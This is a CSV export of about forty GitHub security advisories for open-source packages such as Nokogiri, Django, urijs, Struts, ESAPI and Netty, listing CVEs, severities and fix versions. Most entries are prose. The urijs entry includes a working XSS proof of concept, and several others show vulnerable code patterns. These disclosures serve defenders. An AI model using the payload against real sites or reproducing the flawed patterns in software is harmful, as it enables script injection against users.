2424,12847,Microsoft.NETCore.App,GHSA-7mfr-774f-w5r9,CVE-2017-11770,https://github.com/advisories/GHSA-7mfr-774f-w5r9,high,2022-04-12 00:07:34 UTC,Improper Certificate Validation,".NET Core 1.0, 1.1, and 2.0 allow an unauthenticated attacker to remotely cause a denial of service attack against a .NET Core web application by improperly parsing certificate data. A denial of service vulnerability exists when .NET Core improperly handles parsing certificate data, aka "".NET CORE Denial Of Service Vulnerability"".",nuget
2425,13009,System.Security.Cryptography.X509Certificates,GHSA-7mfr-774f-w5r9,CVE-2017-11770,https://github.com/advisories/GHSA-7mfr-774f-w5r9,high,2022-04-12 00:07:34 UTC,Improper Certificate Validation,".NET Core 1.0, 1.1, and 2.0 allow an unauthenticated attacker to remotely cause a denial of service attack against a .NET Core web application by improperly parsing certificate data. A denial of service vulnerability exists when .NET Core improperly handles parsing certificate data, aka "".NET CORE Denial Of Service Vulnerability"".",nuget
2426,18823,nokogiri,GHSA-gx8x-g87m-h5q6,,https://github.com/advisories/GHSA-gx8x-g87m-h5q6,high,2022-04-11 21:38:11 UTC,Denial of Service (DoS) in Nokogiri on JRuby,"## Summary

Nokogiri `v1.13.4` updates the vendored `org.cyberneko.html` library to `1.9.22.noko2` which addresses [CVE-2022-24839](https://github.com/sparklemotion/nekohtml/security/advisories/GHSA-9849-p7jc-9rmv). That CVE is rated 7.5 (High Severity).

See [GHSA-9849-p7jc-9rmv](https://github.com/sparklemotion/nekohtml/security/advisories/GHSA-9849-p7jc-9rmv) for more information.

Please note that this advisory only applies to the **JRuby** implementation of Nokogiri `< 1.13.4`.


## Mitigation

Upgrade to Nokogiri `>= 1.13.4`.


## Impact

### [CVE-2022-24839](https://github.com/sparklemotion/nekohtml/security/advisories/GHSA-9849-p7jc-9rmv) in nekohtml

- **Severity**: High 7.5
- **Type**: [CWE-400](https://cwe.mitre.org/data/definitions/400.html) Uncontrolled Resource Consumption
- **Description**: The fork of `org.cyberneko.html` used by Nokogiri (Rubygem) raises a `java.lang.OutOfMemoryError` exception when parsing ill-formed HTML markup.
- **See also**: [GHSA-9849-p7jc-9rmv](https://github.com/sparklemotion/nekohtml/security/advisories/GHSA-9849-p7jc-9rmv)
",rubygems
2427,18823,nokogiri,GHSA-xxx9-3xcr-gjj3,,https://github.com/advisories/GHSA-xxx9-3xcr-gjj3,moderate,2022-04-11 21:30:00 UTC,XML Injection in Xerces Java affects Nokogiri,"## Summary

Nokogiri v1.13.4 updates the vendored `xerces:xercesImpl` from 2.12.0 to 2.12.2, which addresses [CVE-2022-23437](https://nvd.nist.gov/vuln/detail/CVE-2022-23437). That CVE is scored as CVSS 6.5 ""Medium"" on the NVD record.

Please note that this advisory only applies to the **JRuby** implementation of Nokogiri `< 1.13.4`.

## Mitigation

Upgrade to Nokogiri `>= v1.13.4`.

## Impact

### [CVE-2022-23437](https://nvd.nist.gov/vuln/detail/CVE-2022-23437) in xerces-J

- **Severity**: Medium
- **Type**: [CWE-91](https://cwe.mitre.org/data/definitions/91.html) XML Injection (aka Blind XPath Injection)
- **Description**: There's a vulnerability within the Apache Xerces Java (XercesJ) XML parser when handling specially crafted XML document payloads. This causes, the XercesJ XML parser to wait in an infinite loop, which may sometimes consume system resources for prolonged duration. This vulnerability is present within XercesJ version 2.12.1 and the previous versions.
- **See also**: https://github.com/advisories/GHSA-h65f-jvqw-m9fj

",rubygems
2428,18823,nokogiri,GHSA-v6gp-9mmm-c6p5,,https://github.com/advisories/GHSA-v6gp-9mmm-c6p5,high,2022-04-11 21:21:28 UTC,Out-of-bounds Write in zlib affects Nokogiri,"## Summary

Nokogiri v1.13.4 updates the vendored zlib from 1.2.11 to 1.2.12, which addresses [CVE-2018-25032](https://nvd.nist.gov/vuln/detail/CVE-2018-25032). That CVE is scored as CVSS 7.4 ""High"" on the NVD record as of 2022-04-05.

Please note that this advisory only applies to the CRuby implementation of Nokogiri `< 1.13.4`, and only if the packaged version of `zlib` is being used. Please see [this document](https://nokogiri.org/LICENSE-DEPENDENCIES.html#default-platform-release-ruby) for a complete description of which platform gems vendor `zlib`. If you've overridden defaults at installation time to use system libraries instead of packaged libraries, you should instead pay attention to your distro's `zlib` release announcements. 

## Mitigation

Upgrade to Nokogiri `>= v1.13.4`.

## Impact

### [CVE-2018-25032](https://nvd.nist.gov/vuln/detail/CVE-2018-25032) in zlib

- **Severity**: High
- **Type**: [CWE-787](https://cwe.mitre.org/data/definitions/787.html) Out of bounds write
- **Description**: zlib before 1.2.12 allows memory corruption when deflating (i.e., when compressing) if the input has many distant matches.

",rubygems
2429,18823,nokogiri,GHSA-crjr-9rc5-ghw8,CVE-2022-24836,https://github.com/advisories/GHSA-crjr-9rc5-ghw8,high,2022-04-11 21:18:06 UTC,Nokogiri Inefficient Regular Expression Complexity,"## Summary

Nokogiri `< v1.13.4` contains an inefficient regular expression that is susceptible to excessive backtracking when attempting to detect encoding in HTML documents.


## Mitigation

Upgrade to Nokogiri `>= 1.13.4`.


## Severity

The Nokogiri maintainers have evaluated this as [**High Severity** 7.5 (CVSS3.1)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).


## References

[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html) Inefficient Regular Expression Complexity


## Credit

This vulnerability was reported by HackerOne user ooooooo_q (ななおく).
",rubygems
2430,34046,org.apache.hadoop:hadoop-common,GHSA-gx2c-fvhc-ph4j,CVE-2022-26612,https://github.com/advisories/GHSA-gx2c-fvhc-ph4j,critical,2022-04-08 00:00:21 UTC,Path traversal in Hadoop,"In Apache Hadoop, The unTar function uses unTarUsingJava function on Windows and the built-in tar utility on Unix and other OSes. As a result, a TAR entry may create a symlink under the expected extraction directory which points to an external directory. A subsequent TAR entry may extract an arbitrary file into the external directory using the symlink name. This however would be caught by the same targetDirPath check on Unix because of the getCanonicalPath call. However on Windows, getCanonicalPath doesn't resolve symbolic links, which bypasses the check. unpackEntries during TAR extraction follows symbolic links which allows writing outside expected base directory on Windows. This was addressed in Apache Hadoop 3.2.3",maven
2431,15851,async,GHSA-fwr7-v2mv-hh25,CVE-2021-43138,https://github.com/advisories/GHSA-fwr7-v2mv-hh25,high,2022-04-07 00:00:17 UTC,Prototype Pollution in async,"A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method.",npm
2432,17237,urijs,GHSA-3vjf-82ff-p4r3,CVE-2022-1243,https://github.com/advisories/GHSA-3vjf-82ff-p4r3,high,2022-04-06 00:01:31 UTC,"Incorrect protocol extraction via \r, \n and \t characters","\r, \n and \t characters in user-input URLs can potentially lead to incorrect protocol extraction when using npm package urijs prior to version 1.19.11.

This can lead to XSS when the module is used to prevent passing in malicious javascript: links into HTML or Javascript (see following example):
````
const parse = require('urijs')
const express = require('express')
const app = express()
const port = 3000

input = ""ja\r\nvascript:alert(1)""
url = parse(input)

console.log(url)

app.get('/', (req, res) => {
 if (url.protocol !== ""javascript:"") {res.send(""<iframe src=\'"" + input + ""\'>CLICK ME!</iframe>"")}
})

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
})
````",npm
2433,17237,urijs,GHSA-g694-m8vq-gv9h,CVE-2022-1233,https://github.com/advisories/GHSA-g694-m8vq-gv9h,moderate,2022-04-05 00:00:17 UTC,URL Confusion When Scheme Not Supplied in medialize/uri.js,"Medialize is a Javascript URL mutation library. When parsing a URL without a scheme and with excessive slashes, like ///www.example.com, URI.js will parse the hostname as null and the path as /www.example.com. Such behaviour is different from that exhibited by browsers, which will parse ///www.example.com as http://www.example.com instead. For example, the following will cause a redirect to http://www.example.com: A fix was released in version 1.19.11.",npm
2434,16567,simple-git,GHSA-28xr-mwxg-3qc8,CVE-2022-24066,https://github.com/advisories/GHSA-28xr-mwxg-3qc8,high,2022-04-02 00:00:13 UTC,Command injection in simple-git,"`simple-git` (maintained as [git-js](https://github.com/steveukx/git-js) named repository on GitHub) is a light weight interface for running git commands in any node.js application.The package simple-git before 3.5.0 are vulnerable to Command Injection due to an incomplete fix of [CVE-2022-24433](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199) which only patches against the git fetch attack vector. A similar use of the --upload-pack feature of git is also supported for git clone, which the prior fix didn't cover. A fix was released in simple-git@3.5.0.",npm
2435,30443,vyper,GHSA-4mrx-6fxm-8jpg,CVE-2022-24788,https://github.com/advisories/GHSA-4mrx-6fxm-8jpg,high,2022-04-20 20:31:44 UTC,Buffer Overflow in vyper,"### Impact
Importing a function from a JSON interface which returns `bytes` generates bytecode which does not clamp bytes length, potentially resulting in a buffer overrun.

### Patches
0.3.2 (as of https://github.com/vyperlang/vyper/commit/049dbdc647b2ce838fae7c188e6bb09cf16e470b)

### Workarounds
Use .vy interfaces.",pip
2436,18550,convict,GHSA-x2w5-725j-gf2g,CVE-2022-22143,https://github.com/advisories/GHSA-x2w5-725j-gf2g,high,2022-04-20 16:21:03 UTC,Prototype Pollution in convict,"### Impact

* An attacker can inject attributes that are used in other components
* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.

The main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.

### Patches

The problem is patched in `convict@6.2.3`. Users should upgrade to `convict@6.2.3`.

### Workarounds

No way for users to fix or remediate the vulnerability without upgrading

### References

* https://www.huntr.dev/bounties/1-npm-convict/
* #384
* 3b86be087d8f14681a9c889d45da7fe3ad9cd880
* 1ea0ab19c5208f66509e1c43b0d0f21c1fd29b75

### For more information

If you have any questions or comments about this advisory: 
add your question as a comment in #384 
",npm
2437,12868,jQuery,GHSA-mhpp-875w-9cpv,CVE-2016-10707,https://github.com/advisories/GHSA-mhpp-875w-9cpv,high,2018-01-22 13:32:42 UTC,Denial of Service in jquery,"Affected versions of `jquery` use a lowercasing logic on attribute names. When given a boolean attribute with a name that contains uppercase characters, `jquery` enters into an infinite recursion loop, exceeding the call stack limit, and resulting in a denial of service condition.


## Recommendation

Update to version 3.0.0 or later.",nuget
2438,19832,Django,GHSA-w24h-v9qh-8gxj,CVE-2022-28347,https://github.com/advisories/GHSA-w24h-v9qh-8gxj,critical,2022-04-13 00:00:33 UTC,SQL Injection in Django,"A SQL injection issue was discovered in QuerySet.explain() in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. This occurs by passing a crafted dictionary (with dictionary expansion) as the **options argument, and placing the injection payload in an option name.",pip
2439,15835,grunt,GHSA-j383-35pm-c5h4,CVE-2022-0436,https://github.com/advisories/GHSA-j383-35pm-c5h4,moderate,2022-04-13 00:00:16 UTC,Path Traversal in Grunt,Grunt prior to version 1.5.2 is vulnerable to path traversal.,npm
2440,20473,markdown2,GHSA-72cx-5ff9-4hhc,CVE-2009-3724,https://github.com/advisories/GHSA-72cx-5ff9-4hhc,moderate,2022-04-21 01:54:03 UTC,Cross-site scripting in markdown2 for python,python-markdown2 before 1.0.1.14 has multiple cross-site scripting (XSS) issues.,pip
2441,38629,org.owasp.antisamy:antisamy,GHSA-3pqg-4rqg-pg9g,CVE-2022-28367,https://github.com/advisories/GHSA-3pqg-4rqg-pg9g,moderate,2022-04-23 00:03:04 UTC,Cross-site Scripting in OWASP AntiSamy,"OWASP AntiSamy is a library for performing fast, configurable cleansing of HTML coming from untrusted sources. AntiSamy before 1.6.6 allows XSS via HTML tag smuggling on STYLE content with crafted input. The output serializer does not properly encode the supposed Cascading Style Sheets (CSS) content.",maven
2442,38629,org.owasp.antisamy:antisamy,GHSA-vp37-2f9p-3vr3,CVE-2022-29577,https://github.com/advisories/GHSA-vp37-2f9p-3vr3,moderate,2022-04-23 00:03:04 UTC,Cross-site Scripting in OWASP AntiSamy,"AntiSamy is a library for performing fast, configurable cleansing of HTML coming from untrusted sources. OWASP AntiSamy before 1.6.7 allows XSS via HTML tag smuggling on STYLE content with crafted input. The output serializer does not properly encode the supposed Cascading Style Sheets (CSS) content. NOTE: this issue exists because of an incomplete fix for CVE-2022-28367.",maven
2443,19832,Django,GHSA-2gwj-7jmv-h26r,CVE-2022-28346,https://github.com/advisories/GHSA-2gwj-7jmv-h26r,critical,2022-04-13 00:00:33 UTC,SQL Injection in Django,"An issue was discovered in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. QuerySet.annotate(), aggregate(), and extra() methods are subject to SQL injection in column aliases via a crafted dictionary (with dictionary expansion) as the passed **kwargs.",pip
2444,20065,PyPDF2,GHSA-xcjx-m2pj-8g79,CVE-2022-24859,https://github.com/advisories/GHSA-xcjx-m2pj-8g79,moderate,2022-04-22 20:54:41 UTC,Manipulated inline images can cause Infinite Loop in PyPDF2,"### Impact

An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop if the PyPDF2 user wrote the following code:

```python
from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2.pdf import ContentStream

reader = PdfFileReader(""malicious.pdf"", strict=False)
for page in reader.pages:
    ContentStream(page.getContents(), reader)
```

### Patches

[`PyPDF2==1.27.5`](https://pypi.org/project/PyPDF2) and later are patched.

Credits to [Sebastian Krause](https://github.com/sekrause) for finding ([issue](https://github.com/py-pdf/PyPDF2/issues/329)) and fixing ([PR](https://github.com/py-pdf/PyPDF2/pull/740)) it.
",pip
2445,33906,org.springframework:spring-core,GHSA-g5mm-vmx4-3rg7,CVE-2022-22968,https://github.com/advisories/GHSA-g5mm-vmx4-3rg7,high,2022-04-15 00:00:32 UTC,Improper handling of case sensitivity in Spring Framework,"In Spring Framework versions 5.3.0 - 5.3.18, 5.2.0 - 5.2.20, and older unsupported versions, the patterns for disallowedFields on a DataBinder are case sensitive which means a field is not effectively protected unless it is listed with both upper and lower case for the first character of the field, including upper and lower case for the first character of all nested fields within the property path. Versions 5.3.19 and 5.2.21 contain a patch for this issue.",maven
2446,16591,nconf,GHSA-6xwr-q98w-rvg7,CVE-2022-21803,https://github.com/advisories/GHSA-6xwr-q98w-rvg7,high,2022-04-13 00:00:30 UTC,Prototype Pollution in nconf,"nconf before 0.11.4. When using the memory engine, it is possible to store a nested JSON representation of the configuration. The .set() function, that is responsible for setting the configuration properties, is vulnerable to Prototype Pollution. By providing a crafted property, it is possible to modify the properties on the Object.prototype.",npm
2447,34974,org.apache.struts:struts2-core,GHSA-v8j6-6c2r-r27c,CVE-2021-31805,https://github.com/advisories/GHSA-v8j6-6c2r-r27c,critical,2022-04-13 00:00:30 UTC,Expression Language Injection in Apache Struts,"The fix issued for CVE-2020-17530 was incomplete. So from Apache Struts 2.0.0 to 2.5.29, still some of the tag’s attributes could perform a double evaluation if a developer applied forced OGNL evaluation by using the %{...} syntax. Using forced OGNL evaluation on untrusted user input can lead to a Remote Code Execution and security degradation.",maven
2448,30443,vyper,GHSA-j2x6-9323-fp7h,CVE-2022-24845,https://github.com/advisories/GHSA-j2x6-9323-fp7h,high,2022-04-22 20:24:13 UTC,Integer bounds error in Vyper,"### Impact
in the following code, the return of `<iface>.returns_int128()` is not validated to fall within the bounds of `int128`. as of v0.3.0, `<iface>.returns_int128()` is validated in simple expressions, but not complex expressions.
```vyper
interface iface:
    def returns_int128() -> int128: view
    def returns_Bytes33() -> Bytes[33]: view

x: iface
 
@external
def call_out():
    x: int128 = self.x.returns_int128()  # affected, <0.3.0
    y: uint256 = convert(self.x.returns_int128(), uint256)  # affected, <0.3.2
    z: Bytes[33] = concat(self.x.returns_Bytes33(), b"""")  # affected >= 0.3.0, <0.3.2
```

### Patches
0.3.2 (as of https://github.com/vyperlang/vyper/commit/049dbdc647b2ce838fae7c188e6bb09cf16e470b)

### Workarounds
Break up operations involving external calls into multiple statements. For instance, instead of the example above, use
```
x: int128 = self.x.returns_int128()
y: uint256 = convert(x, uint256)
```",pip
2449,19060,actionview,GHSA-ch3h-j2vf-95pv,CVE-2022-27777,https://github.com/advisories/GHSA-ch3h-j2vf-95pv,moderate,2022-04-27 22:32:49 UTC,XSS Vulnerability in Action View tag helpers,"There is a possible XSS vulnerability in Action View tag helpers.  Passing
untrusted input as hash keys can lead to a possible XSS vulnerability. This
vulnerability has been assigned the CVE identifier CVE-2022-27777.

Versions Affected:  ALL
Not affected:       NONE
Fixed Versions:     7.0.2.4, 6.1.5.1, 6.0.4.8, 5.2.7.1

## Impact

If untrusted data is passed as the hash key for tag attributes, there is a
possibility that the untrusted data may not be properly escaped which can
lead to an XSS vulnerability.

Impacted code will look something like this:

```
check_box_tag('thename', 'thevalue', false, aria: { malicious_input => 'thevalueofaria' })
```

Where the ""malicious_input"" variable contains untrusted data.

All users running an affected release should either upgrade or use one of the
workarounds immediately.

## Releases

The FIXED releases are available at the normal locations.

## Workarounds

Escape the untrusted data before using it as a key for tag helper methods.
",rubygems
2450,18865,actionpack,GHSA-mm33-5vfq-3mm3,CVE-2022-22577,https://github.com/advisories/GHSA-mm33-5vfq-3mm3,moderate,2022-04-27 22:28:59 UTC,Cross-site Scripting Vulnerability in Action Pack,"There is a possible XSS vulnerability in Rails / Action Pack. This vulnerability has been
assigned the CVE identifier CVE-2022-22577.

Versions Affected:  >= 5.2.0
Not affected:       < 5.2.0
Fixed Versions:     7.0.2.4, 6.1.5.1, 6.0.4.8, 5.2.7.1

## Impact

CSP headers were only sent along with responses that Rails considered as
""HTML"" responses.  This left API requests without CSP headers, which could
possibly expose users to XSS attacks.

## Releases

The FIXED releases are available at the normal locations.

## Workarounds

Set a CSP for your API responses manually.",rubygems
2451,36131,org.owasp.esapi:esapi,GHSA-q77q-vx4q-xx6q,CVE-2022-24891,https://github.com/advisories/GHSA-q77q-vx4q-xx6q,moderate,2022-04-27 21:09:46 UTC,Cross-site Scripting in org.owasp.esapi:esapi,"### Impact
There is a potential for an XSS vulnerability in ESAPI caused by a incorrect regular expression for ""onsiteURL"" in the **antisamy-esapi.xml** configuration file that can cause URLs with the ""javascript:"" scheme to NOT be sanitized. See the reference below for full details.

### Patches
Patched in ESAPI 2.3.0.0 and later. See important remediation details in the reference given below.

### Workarounds
Manually edit your **antisamy-esapi.xml** configuration files to change the ""onsiteURL"" regular expression as per remediation instructions in the reference below.

### References
[Security Bulletin 8](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin8.pdf)

### For more information
If you have any questions or comments about this advisory:
* Email one of the project co-leaders. See email addresses listed on  the [OWASP ESAPI wiki](https://owasp.org/www-project-enterprise-security-api/) page, under ""Leaders"".
* Send email to one of the two ESAPI related Google Groups listed under [Where to Find More Information on ESAPI](https://github.com/ESAPI/esapi-java-legacy#where-to-find-more-information-on-esapi) on our [README.md](https://github.com/ESAPI/esapi-java-legacy#readme) page.
",maven
2452,36131,org.owasp.esapi:esapi,GHSA-8m5h-hrqm-pxm2,CVE-2022-23457,https://github.com/advisories/GHSA-8m5h-hrqm-pxm2,high,2022-04-27 21:09:43 UTC,Path traversal in the OWASP Enterprise Security API,"### Impact
The default implementation of `Validator.getValidDirectoryPath(String, String, File, boolean)` may incorrectly treat the tested input string as a child of the specified parent directory. This potentially could allow control-flow bypass checks to be defeated if an attack can specify the entire string representing the 'input' path.

### Patches
This vulnerability is patched in release 2.3.0.0 of ESAPI. See https://github.com/ESAPI/esapi-java-legacy/releases/tag/esapi-2.3.0.0 for details.

### Workarounds
Yes; in theory, one _could_ write the own implementation of the Validator interface. This would most easily be done by sub-classing a version of the affected `DefaultValidator` class and then overriding the affected `getValidDirectoryPath()` to correct the issue. However, this is not recommended.


### For more information
If you have any questions or comments about this advisory:
* Email one of the project co-leaders. See email addresses listed on  the [OWASP ESAPI wiki](https://owasp.org/www-project-enterprise-security-api/) page, under ""Leaders"".
* Send email to one of the two ESAPI related Google Groups listed under [Where to Find More Information on ESAPI](https://github.com/ESAPI/esapi-java-legacy#where-to-find-more-information-on-esapi) on our [README.md](https://github.com/ESAPI/esapi-java-legacy#readme) page.
",maven
2453,27157,gibbon,GHSA-vx9g-377x-xwxq,CVE-2022-27311,https://github.com/advisories/GHSA-vx9g-377x-xwxq,critical,2022-04-26 00:00:41 UTC,Server side request forgery in gibbon,Gibbon v3.4.3 and below allows attackers to execute a Server-Side Request Forgery (SSRF) via a crafted URL. This issue has been resolved in version 3.4.4,rubygems
2454,16045,ejs,GHSA-phwq-j96m-2c2q,CVE-2022-29078,https://github.com/advisories/GHSA-phwq-j96m-2c2q,critical,2022-04-26 00:00:40 UTC,ejs template injection vulnerability,"The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command (which is executed upon template compilation).",npm
2455,18921,git,GHSA-69p6-wvmq-27gg,CVE-2022-25648,https://github.com/advisories/GHSA-69p6-wvmq-27gg,critical,2022-04-20 00:00:33 UTC,Command injection in ruby-git,"The package git before 1.11.0 are vulnerable to Command Injection via git argument injection. When calling the fetch(remote = 'origin', opts = {}) function, the remote parameter is passed to the git fetch subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection.",rubygems
2456,35825,org.keycloak:keycloak-core,GHSA-f32v-vf79-p29q,CVE-2022-1466,https://github.com/advisories/GHSA-f32v-vf79-p29q,moderate,2022-04-27 00:00:19 UTC,Improper authorization in Keycloak,"Due to improper authorization, Red Hat Single Sign-On is vulnerable to users performing actions that they should not be allowed to perform. It was possible to add users to the master realm even though no respective permission was granted.",maven
2457,17537,cross-fetch,GHSA-7gc6-qh9x-w6h8,CVE-2022-1365,https://github.com/advisories/GHSA-7gc6-qh9x-w6h8,moderate,2022-04-17 00:00:32 UTC,Incorrect Authorization in cross-fetch,"When fetching a remote url with Cookie if it get Location response header then it will follow that url and try to fetch that url with provided cookie . So cookie is leaked here to thirdparty.
Ex: you try to fetch example.com with cookie and if it get redirect url to attacker.com then it fetch that redirect url with provided cookie .",npm
2458,16285,sqlite3,GHSA-9qrh-qjmc-5w2p,CVE-2022-21227,https://github.com/advisories/GHSA-9qrh-qjmc-5w2p,high,2022-04-28 20:25:23 UTC,Denial-of-Service when binding invalid parameters in sqlite3,"Affected versions of sqlite3 will experience a fatal error when supplying a specific object in the parameter array. This error causes the application to crash and could not be caught. Users of `sqlite3` v5.0.0, v5.0.1 and v5.0.2 are affected by this. This issue is fixed in v5.0.3. All users are recommended to upgrade to v5.0.3 or later. Ensure there is sufficient sanitization in the parent application to protect against invalid values being supplied to binding parameters as a workaround.
",npm
2459,20315,httpx,GHSA-h8pj-cxx2-jfg2,CVE-2021-41945,https://github.com/advisories/GHSA-h8pj-cxx2-jfg2,critical,2022-04-29 00:00:25 UTC,Improper Input Validation in httpx,"Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `httpx.URL`, `httpx.Client` and some functions using `httpx.URL.copy_with`.",pip
2460,18643,materialize-css,GHSA-7jvx-f994-rfw2,CVE-2022-25349,https://github.com/advisories/GHSA-7jvx-f994-rfw2,moderate,2022-05-03 00:00:45 UTC,materialize-css vulnerable to cross-site Scripting (XSS) due to improper escape of user input,"All versions of package materialize-css are vulnerable to Cross-site Scripting (XSS) due to improper escape of user input (such as &lt;not-a-tag /&gt;) that is being parsed as HTML/JavaScript, and inserted into the Document Object Model (DOM). This vulnerability can be exploited when the user-input is provided to the autocomplete component.",npm
2461,18841,sinatra,GHSA-qp49-3pvw-x4m5,CVE-2022-29970,https://github.com/advisories/GHSA-qp49-3pvw-x4m5,high,2022-05-03 00:00:43 UTC,sinatra does not validate expanded path matches,Sinatra before 2.2.0 does not validate that the expanded path matches public_dir when serving static files.,rubygems
2462,16174,angular,GHSA-m2h2-264f-f486,CVE-2022-25844,https://github.com/advisories/GHSA-m2h2-264f-f486,moderate,2022-05-03 00:00:44 UTC,angular vulnerable to regular expression denial of service (ReDoS),"AngularJS lets users write client-side web applications. The package angular after 1.7.0 is vulnerable to Regular Expression Denial of Service (ReDoS) by providing a custom locale rule that makes it possible to assign the parameter in posPre: ' '.repeat() of NUMBER_FORMATS.PATTERNS[1].posPre with a very high value.

**Note:**
1. This package has been deprecated and is no longer maintained.
2. The vulnerable versions are 1.7.0 and higher.",npm
2463,17909,libxmljs,GHSA-773h-w45w-f2f9,CVE-2022-21144,https://github.com/advisories/GHSA-773h-w45w-f2f9,high,2022-05-03 00:00:46 UTC,Denial of service vulnerability exists in libxmljs,libxmljs provides libxml bindings for v8 javascript engine. This affects all versions of package libxmljs. When invoking the libxmljs.parseXml function with a non-buffer argument the V8 code will attempt invoking the .toString method of the argument. If the argument's toString value is not a Function object V8 will crash.,npm
2464,34365,io.netty:netty-codec-http,GHSA-269q-hmxg-m83q,CVE-2022-24823,https://github.com/advisories/GHSA-269q-hmxg-m83q,moderate,2022-05-10 08:46:50 UTC,Local Information Disclosure Vulnerability in io.netty:netty-codec-http,"### Description ###
[GHSA-5mcr-gq6c-3hq2](https://github.com/netty/netty/security/advisories/GHSA-5mcr-gq6c-3hq2) (CVE-2021-21290) contains an insufficient fix for the vulnerability identified.

### Impact ###

When netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled.

This only impacts applications running on Java version 6 and lower. Additionally, this vulnerability impacts code running on Unix-like systems, and very old versions of Mac OSX and Windows as they all share the system temporary directory between all users.

### Vulnerability Details ###

To fix the vulnerability the code was changed to the following:

```java
    @SuppressJava6Requirement(reason = ""Guarded by version check"")
    public static File createTempFile(String prefix, String suffix, File directory) throws IOException {
        if (javaVersion() >= 7) {
            if (directory == null) {
                return Files.createTempFile(prefix, suffix).toFile();
            }
            return Files.createTempFile(directory.toPath(), prefix, suffix).toFile();
        }
        if (directory == null) {
            return File.createTempFile(prefix, suffix);
        }
        File file = File.createTempFile(prefix, suffix, directory);
        // Try to adjust the perms, if this fails there is not much else we can do...
        file.setReadable(false, false);
        file.setReadable(true, true);
        return file;
    }
```

Unfortunately, this logic path was left vulnerable:

```java
        if (directory == null) {
            return File.createTempFile(prefix, suffix);
        }
```

This file is still readable by all local users.

### Patches ###

Update to 4.1.77.Final

### Workarounds ###

Specify your own `java.io.tmpdir` when you start the JVM or use `DefaultHttpDataFactory.setBaseDir(...)` to set the directory to something that is only readable by the current user or update to Java 7 or above.

### References ###

 - [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
 - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)


### For more information ###

If you have any questions or comments about this advisory:

Open an issue in [netty](https://github.com/netty/netty)
",maven
2465,18823,nokogiri,GHSA-cgx6-hpwq-fhv5,,https://github.com/advisories/GHSA-cgx6-hpwq-fhv5,high,2022-05-18 20:06:48 UTC,Integer Overflow or Wraparound in libxml2 affects Nokogiri,"### Summary

Nokogiri v1.13.5 upgrades the packaged version of its dependency libxml2 from v2.9.13 to [v2.9.14](https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.9.14).

libxml2 v2.9.14 addresses [CVE-2022-29824](https://nvd.nist.gov/vuln/detail/CVE-2022-29824). This version also includes several security-related bug fixes for which CVEs were not created, including a potential double-free, potential memory leaks, and integer-overflow.

Please note that this advisory only applies to the CRuby implementation of Nokogiri `< 1.13.5`, and only if the _packaged_ libraries are being used. If you've overridden defaults at installation time to use _system_ libraries instead of packaged libraries, you should instead pay attention to your distro's `libxml2` and `libxslt` release announcements.


### Mitigation

Upgrade to Nokogiri `>= 1.13.5`.

Users who are unable to upgrade Nokogiri may also choose a more complicated mitigation: compile and link Nokogiri against external libraries libxml2 `>= 2.9.14` which will also address these same issues.


### Impact

#### libxml2 [CVE-2022-29824](https://nvd.nist.gov/vuln/detail/CVE-2022-29824)

- **CVSS3 score**:
  - Unspecified upstream
  - Nokogiri maintainers evaluate at 8.6 (High) ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H)). Note that this is different from the CVSS assessed by NVD.
- **Type**: Denial of service, information disclosure
- **Description**: In libxml2 before 2.9.14, several buffer handling functions in buf.c (xmlBuf*) and tree.c (xmlBuffer*) don't check for integer overflows. This can result in out-of-bounds memory writes. Exploitation requires a victim to open a crafted, multi-gigabyte XML file. Other software using libxml2's buffer functions, for example libxslt through 1.1.35, is affected as well.
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/2554a24

All versions of libml2 prior to v2.9.14 are affected.

Applications parsing or serializing multi-gigabyte documents (in excess of INT_MAX bytes) may be vulnerable to an integer overflow bug in buffer handling that could lead to exposure of confidential data, modification of unrelated data, or a segmentation fault resulting in a denial-of-service.


### References

- [libxml2 v2.9.14 release notes](https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.9.14)
- [CVE-2022-29824](https://nvd.nist.gov/vuln/detail/CVE-2022-29824)
- [CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer](https://cwe.mitre.org/data/definitions/119.html)

",rubygems
2466,33891,com.google.code.gson:gson,GHSA-4jrv-ppp4-jm57,CVE-2022-25647,https://github.com/advisories/GHSA-4jrv-ppp4-jm57,high,2022-05-03 00:00:44 UTC,Deserialization of Untrusted Data in Gson,"The package `com.google.code.gson:gson` before 2.8.9 is vulnerable to Deserialization of Untrusted Data via the `writeReplace()` method in internal classes, which may lead to denial of service attacks.",maven
